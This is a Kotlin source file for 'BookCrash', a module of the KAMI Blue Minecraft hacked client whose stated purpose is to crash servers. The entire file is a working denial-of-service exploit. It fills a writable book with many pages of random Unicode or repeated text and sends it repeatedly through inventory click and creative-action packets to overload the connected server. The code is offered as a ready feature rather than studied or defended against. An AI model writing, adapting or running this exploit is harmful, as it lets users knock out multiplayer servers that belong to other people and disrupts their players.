package me.zeroeightsix.kami.module.modules.misc

import me.zeroeightsix.kami.event.events.SafeTickEvent
import me.zeroeightsix.kami.module.Module
import me.zeroeightsix.kami.setting.Settings
import me.zeroeightsix.kami.util.TickTimer
import me.zeroeightsix.kami.util.TimeUnit
import me.zeroeightsix.kami.util.text.MessageSendHelper.sendChatMessage
import net.minecraft.init.Items
import net.minecraft.inventory.ClickType
import net.minecraft.item.ItemStack
import net.minecraft.nbt.NBTTagCompound
import net.minecraft.nbt.NBTTagList
import net.minecraft.nbt.NBTTagString
import net.minecraft.network.play.client.CPacketClickWindow
import net.minecraft.network.play.client.CPacketCreativeInventoryAction
import org.kamiblue.event.listener.listener
import java.util.*
import java.util.stream.Collectors
import java.util.stream.IntStream

@Module.Info(
        name = "BookCrash",
        category = Module.Category.MISC,
        description = "Crashes servers by sending large packets"
)
object BookCrash : Module() {
    private val mode = register(Settings.e<Mode>("Mode", Mode.RAION))
    private val fillMode = register(Settings.e<FillMode>("FillMode", FillMode.RANDOM))
    private val uses = register(Settings.integerBuilder("Uses").withValue(2).withRange(1, 10))
    private val delay = register(Settings.integerBuilder("Delay").withValue(0).withRange(0, 40))
    private val pages = register(Settings.integerBuilder("Pages").withValue(50).withRange(1, 100))

    private enum class Mode {
        JESSICA, RAION
    }

    private enum class FillMode {
        ASCII, REPEAT, RANDOM
    }

    private val timer = TickTimer(TimeUnit.TICKS)

    init {
        listener<SafeTickEvent> {
            if (mc.currentServerData == null || mc.currentServerData?.serverIP.isNullOrBlank() || mc.connection == null) {
                sendChatMessage("Not connected to a server")
                disable()
                return@listener
            }

            if (!timer.tick(delay.value.toLong())) return@listener

            val list = NBTTagList()
            val text: String

            text = when (fillMode.value as FillMode) {
                FillMode.RANDOM -> {
                    val chars = Random().ints(0x80, 0x10FFFF - 0x800).map { if (it < 0xd800) it else it + 0x800 }
                    chars.collectToPages()
                }
                FillMode.REPEAT -> {
                    repeat(pages.value * 210, 0x10FFFF.toString())
                }
                FillMode.ASCII -> {
                    val chars = Random().ints(0x20, 0x7E)
                    chars.collectToPages()
                }
            }

            for (i in 0 until pages.value) {
                list.appendTag(NBTTagString(text))
            }

            val tag = NBTTagCompound().apply {
                setString("author", "KAMI Blue")
                setString("title", "\n Minecraft pozzed \n")
                setTag("pages", list)
            }
            val bookObj = ItemStack(Items.WRITABLE_BOOK).apply {
                setTagInfo("pages", list)
                tagCompound = tag
            }

            for (i in 0 until uses.value) {
                mc.connection!!.sendPacket(CPacketClickWindow(0, 0, 0, ClickType.PICKUP, bookObj, 0.toShort()))
                if (mode.value == Mode.JESSICA) {
                    mc.connection!!.sendPacket(CPacketCreativeInventoryAction(0, bookObj))
                }
            }
        }
    }

    private fun IntStream.collectToPages() =
        this.limit(210 * pages.value.toLong()).mapToObj<String> { it.toChar().toString() }.collect(Collectors.joining())

    private fun repeat(count: Int, with: String): String {
        return String(CharArray(count)).replace("\u0000", with)
    }
}
